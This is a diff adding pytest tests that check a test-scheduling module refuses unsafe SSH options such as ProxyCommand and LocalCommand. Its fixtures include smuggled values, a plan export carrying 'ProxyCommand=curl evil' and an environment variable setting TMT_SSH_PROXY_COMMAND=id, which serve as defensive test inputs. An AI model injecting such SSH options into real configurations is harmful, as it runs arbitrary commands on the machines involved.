@@ -137,6 +137,73 @@ def test_shared(module):
         assert module.glue.has_shared(functions)
 
 
+@pytest.mark.parametrize('args, expected', [
+    ([], []),
+    (['--unsafe-ssh-options', 'ProxyCommand'], ['proxycommand']),
+    (['--unsafe-ssh-options', 'ProxyCommand,LocalCommand'], ['localcommand', 'proxycommand']),
+    (['--unsafe-ssh-options', 'ProxyCommand', '--unsafe-ssh-options', 'LocalCommand'],
+     ['localcommand', 'proxycommand']),
+])
+def test_unsafe_ssh_options_cli(module, args, expected):
+    module.parse_args(args)
+
+    assert sorted(module.unsafe_ssh_options) == expected
+
+
+def test_unsafe_ssh_options_config(module):
+    module._config['unsafe-ssh-options'] = 'ProxyCommand, LocalCommand'
+
+    assert sorted(module.unsafe_ssh_options) == ['localcommand', 'proxycommand']
+
+
+def test_create_schedule_rejects_unsafe_plan_ssh_option(module, guest, monkeypatch, tmpdir):
+    module._config['unsafe-ssh-options'] = 'ProxyCommand'
+
+    module_dist_git = create_module(DistGit)[1]
+    module_dist_git._repository = DistGitRepository(
+        module_dist_git, 'some-package',
+        clone_url='http://example.com/git/myproject', branch='myfix'
+    )
+    module.glue.add_shared('dist_git_repository', module_dist_git)
+
+    with monkeypatch.context() as m:
+        m.chdir(tmpdir)
+        _set_run_outputs(
+            m,
+            '',       # git clone
+            'myfix',  # git show-ref
+            'plan1',  # tmt run discover plan --name plan1
+            # tmt plan export
+            r'[{"name": "plan_name", "provision": {"how": "connect", "ssh-option": ["ProxyCommand=curl evil"]}}]')
+
+        with pytest.raises(gluetool.GlueError, match='unsafe SSH options are not allowed'):
+            module.create_test_schedule([guest.environment])
+
+
+def test_run_plan_rejects_unsafe_ssh_environment(module, monkeypatch, tmpdir):
+    module._config['unsafe-ssh-options'] = 'ProxyCommand'
+    module._config['environment-variables'] = ['TMT_SSH_PROXY_COMMAND=id']
+
+    testing_environment = TestingEnvironment('x86_64', 'rhel-9')
+    schedule_entry = TestScheduleEntry(
+        gluetool.log.Logging().get_logger(),
+        testing_environment,
+        'plan1',
+        tmpdir
+    )
+    schedule_entry.tmt_env_file = module._prepare_tmt_env_file(testing_environment, 'plan1', tmpdir)
+    schedule_entry.work_dirpath = os.path.join(tmpdir, 'some-workdir')
+    os.mkdir(schedule_entry.work_dirpath)
+
+    with monkeypatch.context() as m:
+        _set_run_outputs(m, 'dummy test done')
+
+        with monkeypatch.context() as m:
+            m.chdir(tmpdir)
+            with pytest.raises(gluetool.GlueError, match='unsafe SSH options are not allowed'):
+                module.run_test_schedule_entry(schedule_entry)
+
+
 def _assert_results(results, expected_results):
     for result, expected in zip(results, expected_results):
         assert result.name == expected['name']
